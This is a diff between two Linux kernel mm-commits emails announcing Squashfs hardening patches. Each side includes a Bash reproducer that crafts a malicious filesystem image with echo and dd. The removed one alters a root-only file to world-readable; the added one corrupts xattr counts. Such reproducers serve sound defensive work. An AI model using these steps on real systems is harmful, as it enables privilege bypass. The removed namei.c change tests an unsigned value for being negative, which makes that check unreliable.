@@ -1,46 +1,46 @@
 Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=100.103.45.18
 ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
-	t=1794510647;
-	b=3/2H+gd5vESidXDDCkBKFu6e8p45EvQj26IT8br/dX0r1jwvIbwNxHKEKFxayY2o030r
-	 W3LcumwjkxwkL02rgo0m0MH0N2rwUBFycgCdUaDj12LvgZ8z90/Jfg84xGGh7G2EESlj1
-	 zRnzhpvoau88+K6/YY0QMjTGQ9Nl2DCskRcWNpMw11gs/iSvZLsIqWVPvEkpvKDc2ECHV
-	 2MTu77vLP5bS4NOv2LZxEa0ztDJHD/f0d1P3ICO7A650+OUGVZhzvUegmoURhwgUHFSK+
-	 a2Nx7sNiwutFLZYjM7869AeLQZU+rcADpT0qGBX2w0oQuiVTFgN9u/IfC8HledPaQnA==
+	t=1794510651;
+	b=vpw9gOimYxNBa4MLZeVkHB+5CQnHet8RmOmNX5OIo4yO7aPoOOeK0wbsZdofJLc3D9WF
+	 bHTWx4A185A8DZQ0oZSWPaW+qzgQyhdQa1mk/5cg0HN7wjVQ7T5ytP3kJIc+q7Eo3FhGP
+	 BjSvqE7oUlOnMI9zw+MS6sP+YFnZKbppvNAgVBfLrh6YP8noriAniZim7HoVyuImqmdtx
+	 cS9EnnxbJIM3LudqbFtD6ex/XZA6psfG4G4BPl3iGKMpoi9Z1gi4al80R/fj81YsNMS6e
+	 Ab0v7NH9LGmfBH1NrRlf2BjgPxEoKmj/3hVyIwioG3JP+tykZd44+U5P7svoFH6YpUw==
 ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
-	a=rsa-sha256; c=relaxed/relaxed; t=1794510647;
+	a=rsa-sha256; c=relaxed/relaxed; t=1794510651;
 	h=Received:DKIM-Signature:Date:To:From:Subject:Message-Id;
-	bh=92xVqzcRo2imsDWIyFZciSfGVpxqcAPBU70OiFQNZ+4=;
-	b=DIqK4EkDrOY2DsW8hbE3YtMwXn07qQ3R5Vo1mmSYmIqnq8sMuZoUAPaHiu/KohDvHY80
-	 p4Q2Z3eLI49LKftRtZ/yJc7vnpQlm/FKOznaidHUXZPhR4toq+5FDB3NZiQfkGN/QzoN8
-	 Z4kFRyn3K5+Plwpr5bjOFbMQ9vbZrowlEZoOqPy8cGuZU+O+xBBJWjmIdmbysrROI7SeF
-	 jBlD50od5QNU3IOEwjqiYgoqslnpf7Ci9MUbTz6Jvxe8fyK9N//vD2ZLn2vDYbemI8o/l
-	 agEnj/FayqVBW9a2+rfAznVgzrRBvtajjqfaUFrleg7RqRQBUccFdyFQk8hymliESFQ==
+	bh=rIOIVJZif4ZcVkVrjcUcbj8xkE2azZGlUpMv+3dPy8w=;
+	b=SA9WBxI0BvyfPyLAMtdj6fL5vAW3wdDLJtEdhOrylOlQV9uLJwQIFdjRVueAqEOQNLlD
+	 rbyUP+5A7xRogla4PrX/+SFmkvexppYa3FbJd96wKJOkbGFxi2akNhlfr/le8r6zDYYYX
+	 u4HdyJpoiMFSFbTZgoFJGe6szsFXbJe7wXRbjXotSgP0QoaAfXe6Ji1eVdqHcgWC5w22h
+	 PhjdC9mn2iH7YFAxBcDa5FKSSCtxfCaPuqSjpSLX3hqSYrAiER9qwJUWr09UodDo392op
+	 G2jC8xzzs+XoKVq5TP2KGbwtHSor/55cmnxjgez4ziQF9dV2b6nSMOPsjCm5uRcIFcA==
 ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
-	dkim=pass header.d=linux-foundation.org header.i=@linux-foundation.org header.a=rsa-sha256 header.s=korg header.b=Es7+iaPB;
+	dkim=pass header.d=linux-foundation.org header.i=@linux-foundation.org header.a=rsa-sha256 header.s=korg header.b=IMStfmBr;
 	arc=none smtp.remote-ip=100.103.45.18
 Received: from smtp.kernel.org (quasi.space.kernel.org [100.103.45.18])
 	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 	 key-exchange X25519 server-signature ECDSA (prime256v1))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 11DDD606A31C
-	for <mm-commits@vger.kernel.org>; Thu, 12 Nov 2026 19:10:47 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 586D4606A31C
+	for <mm-commits@vger.kernel.org>; Thu, 12 Nov 2026 19:10:51 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=linux-foundation.org header.i=@linux-foundation.org header.a=rsa-sha256 header.s=korg header.b=Es7+iaPB
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id CD3C61F000C4;
-	Thu, 12 Nov 2026 19:10:46 +0000 (UTC)
+	dkim=pass (1024-bit key) header.d=linux-foundation.org header.i=@linux-foundation.org header.a=rsa-sha256 header.s=korg header.b=IMStfmBr
+Received: by smtp.kernel.org (Postfix) with ESMTPSA id 1A2A71F000C4;
+	Thu, 12 Nov 2026 19:10:51 +0000 (UTC)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-	d=linux-foundation.org; s=korg; t=1794510646;
-	bh=92xVqzcRo2imsDWIyFZciSfGVpxqcAPBU70OiFQNZ+4=;
+	d=linux-foundation.org; s=korg; t=1794510651;
+	bh=rIOIVJZif4ZcVkVrjcUcbj8xkE2azZGlUpMv+3dPy8w=;
 	h=Date:To:From:Subject;
-	b=Es7+iaPBe48emq5ZNmGB+XRkGcDkQxzC41g2+l4eXi0MJE5Rri3SG4BYFlbulopz2
-	 A8fuSYbcdByeGeuhoSaHhstSQAp94hhd1UESt/a34sIB9pGhu38p7aIWU0JWk0J4lL
-	 m9p0zUDMT+HVIV7lyGENgXAY/KMsPCMjEbncV6XU=
-Date: Thu, 12 Nov 2026 11:10:46 -0800
+	b=IMStfmBr7x+Qdk1LnghIhqsDjIjXDzxrhtckpeaP19HohojAYAavOHvbcIl4DPTNs
+	 ytNVGbpY63K2rJBnb3moP0CT90a3MsFSUNvNxHW/FZAuJH9U5WRm7F7zRVs501e4gX
+	 kXeS5+Ynmz3p+kFVO8RFEPKRoXu5UIcItx31yg1c=
+Date: Thu, 12 Nov 2026 11:10:50 -0800
 To: mm-commits@vger.kernel.org,phillip.lougher@gmail.com,
 	phillip@squashfs.org.uk,akpm@linux-foundation.org
 From: Andrew Morton <akpm@linux-foundation.org>
-Subject: + squashfs-sanity-check-directory-metadata-block-location.patch added to mm-nonmm-unstable branch
-Message-Id: <20261112191046.CD3C61F000C4@smtp.kernel.org>
+Subject: + squashfs-widen-xattr-count-variables-and-add-sanity-check.patch added to mm-nonmm-unstable branch
+Message-Id: <20261112191051.1A2A71F000C4@smtp.kernel.org>
 X-Mailing-List: mm-commits@vger.kernel.org
 List-Id: <mm-commits.vger.kernel.org>
 List-Post: <mailto:mm-commits@vger.kernel.org>
@@ -52,12 +52,12 @@ Precedence: list
 
 
 The patch titled
-     Subject: Squashfs: sanity check directory metadata block location
+     Subject: Squashfs: widen xattr count variables and add sanity check
 has been added to the -mm mm-nonmm-unstable branch.  Its filename is
-     squashfs-sanity-check-directory-metadata-block-location.patch
+     squashfs-widen-xattr-count-variables-and-add-sanity-check.patch
 
 This patch will shortly appear at
-     https://git.kernel.org/pub/scm/linux/kernel/git/akpm/25-new.git/tree/patches/squashfs-sanity-check-directory-metadata-block-location.patch
+     https://git.kernel.org/pub/scm/linux/kernel/git/akpm/25-new.git/tree/patches/squashfs-widen-xattr-count-variables-and-add-sanity-check.patch
 
 This patch will later appear in the mm-nonmm-unstable branch at
     git://git.kernel.org/pub/scm/linux/kernel/git/akpm/mm
@@ -76,61 +76,38 @@ and is updated there most days
 
 ------------------------------------------------------
 From: Phillip Lougher <phillip@squashfs.org.uk>
-Subject: Squashfs: sanity check directory metadata block location
-Date: Wed, 11 Nov 2026 23:43:51 +0000
+Subject: Squashfs: widen xattr count variables and add sanity check
+Date: Wed, 11 Nov 2026 23:43:52 +0000
 
-The contents of directories are stored in compressed metadata blocks,
-which are placed in the directory table.  The location of a directory
-is thus represented as a tuple, the location of the compressed metadata
-block that the directory is in, and the offset into the uncompressed
-block.  The block location is not absolute, and it is instead encoded
-as an offset from the start of the directory table.
+The maximum number of Xattrs in an inode is 2^32-1 in Squashfs.  However
+the code incorrectly treats the count as signed, or 2^31-1.
 
-An attacker could manipulate the directory block location to make it
-point to a replacement malicious directory stored elsewhere, outside
-the directory table.  This is because the code does not check that the
-location is valid and is within the directory table.
+This means any value above 2^31-1 becomes a negative number, and it
+means loops will not terminate due to the negative comparison.  This
+means the code will continue reading the filesystem until either the
+data is incorrect, or the end of the filesystem is reached.
 
-In practice this exploit is hard to achieve because metadata in Squashfs
-is compressed by default, and so the compressed metadata cannot be
-directly altered.  In addition due to sanity checking at mount time
-there are no gaps in the filesystem to store a malicious directory.
+The code also lacks a check that the count is too large, which will
+again mean that the code will continue reading the filesystem.
 
-Also anyone with access to Mksquashfs/Unsquashfs can copy and recreate
-the filesystem incorporating whatever changes they want.
+Finally, the code also lacks a check for a zero count, this means
+anything reading xattrs from the inode will successfully read no xattrs,
+even though this should have returned error due to corruption.
 
-However, there are a number of exploit scenarios here.  Many embedded
-systems or secure systems have deliverately restricted installations
-with only basic tools, and lack any Mksquashfs/Unsquashfs.  But exploits
-due to this bug can be achieved with only echo and dd.
-
-An example exploit is where a Squashfs filesystem has a file in the
-root directory with permissions 0700 (u=rxw), where only the superuser
-can read it.  But using this bug an attacker could create a malicious
-replacement directory in the inode lookup table (used by NFS), that
-points to a malicious replacement inode that has the permissions
-changed to 0777 (a=wrx).  On reboot/remount this would make the
-file readable by unpriviliged users.
-
-The following shell script acts as a reproducer and proof of concept.
-
-This commit blocks such attempts by adding a new helper
-squashfs_dir_start() which adds additional sanity checking, first
-ensuring no arithmetic operations overflow, and second checking that
-the directory is within the directory table.
+This commit changes the variables to be unsigned, and so negative values
+do not occur, and it first adds a sanity check for a zero xattr count,
+and second checks that the count isn't larger than the xattr size.
 
 Reproducer
 ==========
 
-The following Bash script uses echo and dd to achieve the previously
-discussed exploit.  If the exploit is successful the file "data"
-permissions will be changed to 0777 (a=rwx), but otherwise the
-filesystem is unchanged.
+This reproducer allows both zero, negative and large xattr count to be
+reproduced.  In the case of a negative or large count, the exploit
+succeeds if dmesg shows the code failed to read a metadata block, due to
+the loop not terminating.  In the case of a zero count, the exploit
+succeeds if gerfattr successfully returns with no xattrs.
 
-===================================================================
-#!/bin/bash
-
-ARGS="-no-sparse -no-hardlinks -no-progress -quiet -inode-time 0 -mkfs-time 0"
+====================================================================
 
 finish() {
 	popd 2>&1 > /dev/null
@@ -138,92 +115,62 @@ finish() {
 	exit 1
 }
 
+if [ $# -lt 1 ]; then
+	echo This needs a parameter
+	echo $0 N/0/L
+	echo N reproduce negative xattr count
+	echo 0 reproduce 0 xattr count
+	echo L reproduce a large count
+	exit 1
+fi
+
+if [ $1 = "N" ]; then
+	echo Reproducing negative xattr count
+elif [ $1 = "0" ]; then
+	echo Reproducing 0 xattr count
+elif [ $1 = "L" ]; then
+	echo Reproducing large xattr count
+else
+	echo Input not N, 0 or L
+	exit 1
+fi
+
 DIR=$(mktemp -d)
 
 pushd $DIR 2>&1 > /dev/null
 
-# Create a Squashfs pseudo file which is fed to Mksquashfs
 echo Create a Squashfs pseudo file which is fed to Mksquashfs
 
-dd if=/dev/zero of=zero bs=1024 count=1 status=none
-echo "data f 0700 0 0 echo some data" >> pseudo
-echo "files d 0777 0 0" >> pseudo
-for i in $(seq 1 100); do
-	echo "files/$i f 0655 1000 1000 cat zero" >> pseudo
-done
+echo "/ d 0777 0 0" > pseudo
+echo "example f 0777 0 0 echo example data" >> pseudo
+echo "example x user.comment=example xattr" >> pseudo
 
-# Create a Squashfs filesystem
-echo "Create a Squashfs filesystem"
+echo Generate the Squashfs filesystem
 
-if ! mksquashfs - img.sqsh -pf pseudo -p "/ d 0777 0 0" $ARGS; then
-	echo Failed to create Squashfs filesystem
-	finish
+mksquashfs - img.sqsh -pf pseudo -quiet -no-progress -noX
+
+low=$(dd if=img.sqsh bs=1 skip=56 count=1 status=none | od -An -v -tu1 | tr -d '\n')
+hi=$(dd if=img.sqsh bs=1 skip=57 count=1 status=none | od -An -v -tu1 | tr -d '\n')
+start=$(( $hi * 256 + $low ))
+
+(( start -= 8 ))
+
+if [ $1 = "N" ]; then
+	# Write -1 to the count field
+	echo Writing -1 to the count field
+	echo -ne "\xff\xff\xff\xff" > file
+elif [ $1 = "0" ]; then
+	# Write 0 to the count field
+	echo Writing 0 to the count field
+	echo -ne "\x00\x00\x00\x00" > file
+else
+	# Write 255 to the count field
+	echo Writing 255 to the count field
+	echo -ne "\xff\x00\x00\x00" > file
 fi
 
-# Exploit: The file named "data" has permissions 0700, which can only be
-# read by the superuser.  The desire is to change the permissions on
-# the file to be 0777, which can be read by unpriviliged users.
-#
-# Due to compression of the metadata, this cannot be done by directly
-# writing to the metadata tables.  Instead the real metadata is replaced
-# by malicious metadata starting from the "data" file inode upwards to
-# the root inode.
-#
-# This is a three step process.
-#
-# 1. A new "data" file inode is placed within the inode lookup table
-# 2. A new root directory which points to the new "data" file inode is
-#    placed in the inode lookup table
-# 3. A new root inode which pounts to the new root directory table is
-#    placed in the inode lookup table.
-#
-# For brevity this reproducer uses pre-computed data for the above.
+dd if=file of=img.sqsh bs=1 seek=$start count=4 conv=notrunc status=none
 
-# Write malicious inode for file "data", this is the same as the
-# original except it is uncompressed, and the permissions are set to
-# 0777.
-echo Writing malicious inode for file \"data\"
-
-/usr/bin/echo -en "\x20\x80\x02\x00\xFF\x01\x00\x00\x00\x00\x00\x00\
-\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
-\x00\x0A\x00\x00\x00" > file
-
-dd bs=1 seek=1034 if=file of=img.sqsh count=34 conv=notrunc status=none
-
-# Write directory data which points to the malicious inode
-echo Writing root directory which points to malicious inode
-
-/usr/bin/echo -en "\x31\x80\x00\x00\x00\x00\x90\x03\x00\x00\x01\x00\x00\
-\x00\x00\x00\x00\x00\x02\x00\x03\x00\x64\x61\x74\x61\x00\x00\x00\x00\
-\x00\x00\x00\x00\x02\x00\x00\x00\xA0\x0C\x00\x00\x01\x00\x04\x00\x66\
-\x69\x6c\x65\x73" > file
-
-dd bs=1 seek=983 if=file of=img.sqsh count=51 conv=notrunc status=none
-
-#
-# Write root inode, this is the same as the original root inode, except
-# it is uncompressed, and it points to the new directory data
-echo Writing root inode which points to the new root directory
-
-/usr/bin/echo -en "\x20\x80\x01\x00\xFF\x01\x00\x00\x00\x00\x00\x00\
-\x00\x00\x67\x00\x00\x00\x43\x02\x00\x00\x03\x00\x00\x00\x34\x00\x00\
-\x00\x00\x00\x00\x00" > file
-
-dd bs=1 seek=949 if=file of=img.sqsh count=34 conv=notrunc status=none
-
-# Update the root_inode field in the superblock to point to our new
-# root inode.  The start block is an offset from the inode_table_start,
-# and not an absolute value.  The start of the inode table is 122, the
-# new inode is placed at position 949, and so the offset is 827. Because
-# we've only stored one inode in the metadata block, the offset into
-# that block is 0.
-echo Updating the root_inode field in the superblock
-
-/usr/bin/echo -en "\x00\x00\x3B\x03" > file
-
-dd bs=1 seek=32 if=file of=img.sqsh count=4 conv=notrunc status=none
-
-# Mount the filesystem to /mnt
 echo Mount the filesystem to /mnt
 
 if ! mount -t squashfs img.sqsh /mnt; then
@@ -231,194 +178,156 @@ if ! mount -t squashfs img.sqsh /mnt; then
 	finish
 fi
 
-# Stat /mnt/data, if the exploit is successful, permissions should be 0777
-echo "************************************************************************"
-echo Stat /mnt/data, if the exploit is successful, permissions should be 0777
+if [ $1 = "0" ]; then
+	if ! getfattr /mnt/example > output; then
+		echo Exploit failed, getfattr returned error
+	elif [ ! -s output ]; then
+		echo Exploit succeeded, getfattr returned success with no xattrs
+	else
+		echo Getfattr succeeded with some xattrs.  The filesystem was not corrupted
+	fi
+else
+	if ! getfattr /mnt/example; then
+		echo Getfattr failed, this is expected.
+		echo If dmesg shows the following, then the exploit succeeded
+		echo SQUASHFS error: Failed to read block 0x124: -5
+		echo SQUASHFS error: Unable to read metadata cache entry [122]
+	else
+		echo Getfattr succeeded with some xattrs.  The filesystem was not corrupted
+	fi
+fi
 
-stat /mnt/data
-
-popd 2>&1> /dev/null
-
+popd 2>&1 > /dev/null
 rm -rf $DIR
-=====================================================================
+exit 0
+====================================================================
 
-Link: https://lore.kernel.org/20261111234402.252354-12-phillip@squashfs.org.uk
-Fixes: c88da2c97936 ("Squashfs: directory lookup operations")
+Link: https://lore.kernel.org/20261111234402.252354-13-phillip@squashfs.org.uk
+Fixes: f41d207cbede ("squashfs: add support for xattr reading")
 Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
 Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
 Cc: Phillip Lougher <phillip.lougher@gmail.com>
 ---
 
- fs/squashfs/dir.c              |   20 ++++++++++++++------
- fs/squashfs/namei.c            |   20 +++++++++++++-------
- fs/squashfs/squashfs_fs_sb.h   |    1 +
- fs/squashfs/squashfs_helpers.h |   17 +++++++++++++++++
- fs/squashfs/super.c            |    1 +
- 5 files changed, 46 insertions(+), 13 deletions(-)
+ fs/squashfs/inode.c         |    2 +-
+ fs/squashfs/squashfs_fs_i.h |    2 +-
+ fs/squashfs/xattr.c         |   27 ++++++++++++++++++++-------
+ fs/squashfs/xattr.h         |    6 +++---
+ fs/squashfs/xattr_id.c      |    3 ++-
+ 5 files changed, 27 insertions(+), 13 deletions(-)
 
---- a/fs/squashfs/dir.c~squashfs-sanity-check-directory-metadata-block-location
-+++ a/fs/squashfs/dir.c
-@@ -22,6 +22,7 @@
- #include "squashfs_fs.h"
- #include "squashfs_fs_sb.h"
- #include "squashfs_fs_i.h"
-+#include "squashfs_helpers.h"
- #include "squashfs.h"
+--- a/fs/squashfs/inode.c~squashfs-widen-xattr-count-variables-and-add-sanity-check
++++ a/fs/squashfs/inode.c
+@@ -448,7 +448,7 @@ int squashfs_read_inode(struct inode *in
+ 		inode->i_blocks += ((squashfs_i(inode)->xattr_size - 1) >> 9)
+ 				+ 1;
+ 	} else
+-		squashfs_i(inode)->xattr_count = 0;
++		squashfs_i(inode)->xattr = SQUASHFS_INVALID_BLK;
  
- static const unsigned char squashfs_filetype_table[] = {
-@@ -41,6 +42,7 @@ static int get_dir_index_using_offset(st
- 	int i_count, u64 f_pos)
- {
- 	struct squashfs_sb_info *msblk = sb->s_fs_info;
-+	s64 res;
- 	int err, i, index, length = 0;
- 	unsigned int size;
- 	struct squashfs_dir_index dir_index;
-@@ -81,9 +83,12 @@ static int get_dir_index_using_offset(st
- 		if (err < 0)
- 			break;
- 
-+		res = squashfs_dir_start(le32_to_cpu(dir_index.start_block), msblk);
-+		if (res < 0)
-+			break;
-+
- 		length = index;
--		*next_block = le32_to_cpu(dir_index.start_block) +
--					msblk->directory_table;
-+		*next_block = res;
- 	}
- 
- 	*next_offset = (length + *next_offset) % SQUASHFS_METADATA_SIZE;
-@@ -99,13 +104,16 @@ static int squashfs_readdir(struct file
- {
- 	struct inode *inode = file_inode(file);
- 	struct squashfs_sb_info *msblk = inode->i_sb->s_fs_info;
--	u64 block = squashfs_i(inode)->start + msblk->directory_table;
-+	s64 block = squashfs_dir_start(squashfs_i(inode)->start, msblk);
- 	int offset = squashfs_i(inode)->offset, length, err;
- 	unsigned int inode_number, dir_count, size, type;
- 	struct squashfs_dir_header dirh;
--	struct squashfs_dir_entry *dire;
-+	struct squashfs_dir_entry *dire = NULL;
-+
-+	TRACE("Entered squashfs_readdir [%llx:%x]\n", squashfs_i(inode)->start, offset);
- 
--	TRACE("Entered squashfs_readdir [%llx:%x]\n", block, offset);
-+	if (block < 0)
-+		goto failed_read;
- 
- 	dire = kmalloc(sizeof(*dire) + SQUASHFS_NAME_LEN + 1, GFP_KERNEL);
- 	if (dire == NULL) {
-@@ -211,7 +219,7 @@ finish:
  	return 0;
  
- failed_read:
--	ERROR("Unable to read directory block [%llx:%x]\n", block, offset);
-+	ERROR("Unable to read directory block [%llx:%x]\n", squashfs_i(inode)->start, offset);
- 	kfree(dire);
- 	return 0;
+--- a/fs/squashfs/squashfs_fs_i.h~squashfs-widen-xattr-count-variables-and-add-sanity-check
++++ a/fs/squashfs/squashfs_fs_i.h
+@@ -15,7 +15,7 @@ struct squashfs_inode_info {
+ 	int		offset;
+ 	u64		xattr;
+ 	unsigned int	xattr_size;
+-	int		xattr_count;
++	unsigned int	xattr_count;
+ 	int		parent;
+ 	union {
+ 		struct {
+--- a/fs/squashfs/xattr.c~squashfs-widen-xattr-count-variables-and-add-sanity-check
++++ a/fs/squashfs/xattr.c
+@@ -33,13 +33,16 @@ ssize_t squashfs_listxattr(struct dentry
+ 	u64 start = squashfs_xattr_blk(squashfs_i(inode)->xattr)
+ 						+ msblk->xattr_table;
+ 	int offset = squashfs_xattr_offset(squashfs_i(inode)->xattr);
+-	int count = squashfs_i(inode)->xattr_count;
++	unsigned int count = squashfs_i(inode)->xattr_count;
+ 	size_t rest = buffer_size;
+ 	int err;
+ 
+-	/* check that the file system has xattrs */
+-	if (msblk->xattr_id_table == NULL)
+-		return -EOPNOTSUPP;
++	/* check that the file has xattrs */
++	if (squashfs_i(inode)->xattr == SQUASHFS_INVALID_BLK)
++		return 0;
++
++	if (count == 0 || count > squashfs_i(inode)->xattr_size)
++		return -EIO;
+ 
+ 	/* loop reading each xattr name */
+ 	while (count--) {
+@@ -111,12 +114,21 @@ static int squashfs_xattr_get(struct ino
+ 	u64 start = squashfs_xattr_blk(squashfs_i(inode)->xattr)
+ 						+ msblk->xattr_table;
+ 	int offset = squashfs_xattr_offset(squashfs_i(inode)->xattr);
+-	int count = squashfs_i(inode)->xattr_count;
++	unsigned int count = squashfs_i(inode)->xattr_count;
+ 	int name_len = strlen(name);
+ 	int err, vsize;
+-	char *target = kmalloc(name_len, GFP_KERNEL);
++	char *target;
++
++	/* check that the file has xattrs */
++	if (squashfs_i(inode)->xattr == SQUASHFS_INVALID_BLK)
++		return -ENODATA;
++
++	if (count == 0 || count > squashfs_i(inode)->xattr_size)
++		return -EIO;
++
++	target = kmalloc(name_len, GFP_KERNEL);
+ 	if (target == NULL)
+-		return  -ENOMEM;
++		return -ENOMEM;
+ 
+ 	/* loop reading each xattr name */
+ 	for (; count; count--) {
+@@ -169,6 +181,7 @@ static int squashfs_xattr_get(struct ino
+ 				goto failed;
+ 
+ 			vsize = le32_to_cpu(val.vsize);
++
+ 			if (buffer) {
+ 				if (vsize > buffer_size) {
+ 					err = -ERANGE;
+--- a/fs/squashfs/xattr.h~squashfs-widen-xattr-count-variables-and-add-sanity-check
++++ a/fs/squashfs/xattr.h
+@@ -11,8 +11,8 @@
+ #ifdef CONFIG_SQUASHFS_XATTR
+ extern __le64 *squashfs_read_xattr_id_table(struct super_block *, u64,
+ 		u64 *, unsigned int *);
+-extern int squashfs_xattr_lookup(struct super_block *, unsigned int, int *,
+-		unsigned int *, unsigned long long *);
++extern int squashfs_xattr_lookup(struct super_block *, unsigned int,
++		unsigned int *, unsigned int *, unsigned long long *);
+ #else
+ static inline __le64 *squashfs_read_xattr_id_table(struct super_block *sb,
+ 		u64 start, u64 *xattr_table_start, unsigned int *xattr_ids)
+@@ -31,7 +31,7 @@ static inline __le64 *squashfs_read_xatt
  }
---- a/fs/squashfs/namei.c~squashfs-sanity-check-directory-metadata-block-location
-+++ a/fs/squashfs/namei.c
-@@ -66,6 +66,7 @@ static int get_dir_index_using_name(stru
- 			int index_offset, int i_count, const char *name)
+ 
+ static inline int squashfs_xattr_lookup(struct super_block *sb,
+-		unsigned int index, int *count, unsigned int *size,
++		unsigned int index, unsigned int *count, unsigned int *size,
+ 		unsigned long long *xattr)
+ {
+ 	return 0;
+--- a/fs/squashfs/xattr_id.c~squashfs-widen-xattr-count-variables-and-add-sanity-check
++++ a/fs/squashfs/xattr_id.c
+@@ -27,7 +27,8 @@
+  * Map xattr id using the xattr id look up table
+  */
+ int squashfs_xattr_lookup(struct super_block *sb, unsigned int index,
+-		int *count, unsigned int *size, unsigned long long *xattr)
++		unsigned int *count, unsigned int *size,
++		unsigned long long *xattr)
  {
  	struct squashfs_sb_info *msblk = sb->s_fs_info;
-+	s64 res;
- 	int i, length = 0, err;
- 	unsigned int size;
- 	struct squashfs_dir_index *index;
-@@ -99,9 +100,12 @@ static int get_dir_index_using_name(stru
- 		if (strcmp(index->name, name) > 0)
- 			break;
- 
-+		res = squashfs_dir_start(le32_to_cpu(index->start_block), msblk);
-+		if (res < 0)
-+			break;
-+
- 		length = le32_to_cpu(index->index);
--		*next_block = le32_to_cpu(index->start_block) +
--					msblk->directory_table;
-+		*next_block = res;
- 	}
- 
- 	*next_offset = (length + *next_offset) % SQUASHFS_METADATA_SIZE;
-@@ -126,13 +130,16 @@ static struct dentry *squashfs_lookup(st
- 	struct inode *inode = NULL;
- 	struct squashfs_sb_info *msblk = dir->i_sb->s_fs_info;
- 	struct squashfs_dir_header dirh;
--	struct squashfs_dir_entry *dire;
--	u64 block = squashfs_i(dir)->start + msblk->directory_table;
-+	struct squashfs_dir_entry *dire = NULL;
-+	u64 block = squashfs_dir_start(squashfs_i(dir)->start, msblk);
- 	int offset = squashfs_i(dir)->offset;
- 	int err, length;
- 	unsigned int dir_count, size;
- 
--	TRACE("Entered squashfs_lookup [%llx:%x]\n", block, offset);
-+	TRACE("Entered squashfs_lookup [%llx:%x]\n", squashfs_i(dir)->start, offset);
-+
-+	if (block < 0)
-+		goto data_error;
- 
- 	dire = kmalloc(sizeof(*dire) + SQUASHFS_NAME_LEN + 1, GFP_KERNEL);
- 	if (dire == NULL) {
-@@ -219,8 +226,7 @@ data_error:
- 
- read_failure:
- 	ERROR("Unable to read directory block [%llx:%x]\n",
--		squashfs_i(dir)->start + msblk->directory_table,
--		squashfs_i(dir)->offset);
-+		squashfs_i(dir)->start, squashfs_i(dir)->offset);
- failed:
- 	kfree(dire);
- 	return ERR_PTR(err);
---- a/fs/squashfs/squashfs_fs_sb.h~squashfs-sanity-check-directory-metadata-block-location
-+++ a/fs/squashfs/squashfs_fs_sb.h
-@@ -67,6 +67,7 @@ struct squashfs_sb_info {
- 	__le64					*inode_lookup_table;
- 	u64					inode_table;
- 	u64					directory_table;
-+	u64					directory_table_end;
- 	u64					xattr_table;
- 	unsigned int				block_size;
- 	unsigned short				block_log;
---- a/fs/squashfs/squashfs_helpers.h~squashfs-sanity-check-directory-metadata-block-location
-+++ a/fs/squashfs/squashfs_helpers.h
-@@ -70,6 +70,23 @@ static inline s64 squashfs_mkinode(u32 s
- 	return ((s64)start << 16) | offset;
- }
- 
-+/* directory helper functions */
-+static inline s64 squashfs_dir_start(u32 blk, struct squashfs_sb_info *msblk)
-+{
-+	s64 start;
-+
-+	if (S64_MAX - msblk->directory_table < blk)
-+		return -EINVAL;
-+
-+	start = msblk->directory_table + blk;
-+
-+	if (msblk->directory_table < msblk->directory_table_end &&
-+				start >= msblk->directory_table_end)
-+		return -EINVAL;
-+
-+	return start;
-+}
-+
- /* fragment and fragment table defines */
- static inline s64 squashfs_fragment_bytes(u32 fragments)
- {
---- a/fs/squashfs/super.c~squashfs-sanity-check-directory-metadata-block-location
-+++ a/fs/squashfs/super.c
-@@ -437,6 +437,7 @@ check_directory_table:
- 		err = -EINVAL;
- 		goto insanity;
- 	}
-+	msblk->directory_table_end = next_table;
- 
- 	/* Sanity check inode_table */
- 	if (msblk->inode_table >= msblk->directory_table) {
+ 	int block = squashfs_xattr_block(index);
 _
 
 Patches currently in -mm which might be from phillip@squashfs.org.uk are
